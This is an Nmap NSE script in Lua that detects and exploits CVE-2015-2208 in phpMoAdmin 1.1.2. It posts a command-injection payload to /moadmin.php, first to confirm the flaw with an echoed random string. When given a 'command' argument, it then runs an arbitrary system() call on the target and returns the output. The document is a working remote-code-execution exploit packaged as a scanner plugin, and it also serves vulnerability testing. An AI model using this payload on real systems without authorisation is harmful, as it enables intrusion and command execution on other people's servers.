local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
A simple script based on the exploit mentioned here :
http://1337day.com/exploit/description/23366
The vulnerability allows an attacker to execute arbitrary commands by exploiting the
saveObject function in phpMoAdmin version 1.1.2.
]]

---
-- @args command enter the shell command to be executed [optional]
-- nmap --script=http-vuln-phpmoadmin-rce --script-args command='ls' <targets>
--
--@output
-- PORT     STATE SERVICE  REASON
-- 8000/tcp open  http-alt syn-ack
-- | http-phpmoadmin-rce: 
-- |   VULNERABLE:
-- |   phpMoAdmin 1.1.2 Remote Code Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2015-2208
-- |     Risk factor: High  CVSS2: 7.5
-- |     Description:
-- |       The vulnerability allows an attacker to run arbitrary commands by
-- |           exploiting a dangerous use of the eval() function.
-- |     Exploit results:
-- |       Linux neo 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
-- |   
-- |     References:
-- |       http://www.exploit-db.com/exploits/36251/
-- |       http://1337day.com/exploit/description/23366
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2208
-- |_      http://blog.trendmicro.com/trendlabs-security-intelligence/zero-day-vulnerability-found-in-mongodb-administration-tool-phpmoadmin/
-- Final times for host: srtt: 32 rttvar: 2823  to: 100000

author = {"Gyanendra Mishra"}

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.http

action = function(host, port)

  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command")
  
  local vuln_table = {
    title = "phpMoAdmin 1.1.2 Remote Code Execution",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://1337day.com/exploit/description/23366',
      'http://www.exploit-db.com/exploits/36251/',
      'http://blog.trendmicro.com/trendlabs-security-intelligence/zero-day-vulnerability-found-in-mongodb-administration-tool-phpmoadmin/'
    },
    IDS = {
      CVE = 'CVE-2015-2208'
    },
    scores = {
      CVSS2 =  '7.5'
    },
    description = [[The vulnerability allows an attacker to run arbitrary commands by
    exploiting a dangerous use of the saveObject function.]]
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local rand = string.lower(stdnse.generate_random_string(10))
  local post_data = {}
  post_data['object'] = "1;echo '"..rand.."';exit"
  
  local response,status = http.post(host,port,'/moadmin.php',nil,nil,post_data)
  
  if response and response.body:match(rand) then
    vuln_table.state = vulns.STATE.EXPLOIT
    if command then
      post_data['object'] = "1;system('"..command.."');exit"
      response,status = http.post(host,port,'/moadmin.php',nil,nil,post_data)
      vuln_table.exploit_results = response.body
    end
    port.version = {
            name = 'phpMoAdmin',
            name_confidence = 10,
            product = 'phpMoAdmin',
            version = '1.1.2',
            service_tunnel = 'none',
            cpe = {'cpe:/a:avinu:phpmoadmin:1.1.2'}
          }
    nmap.set_port_version(host,port,'hardmatched')
  end  
  return report:make_output(vuln_table)
end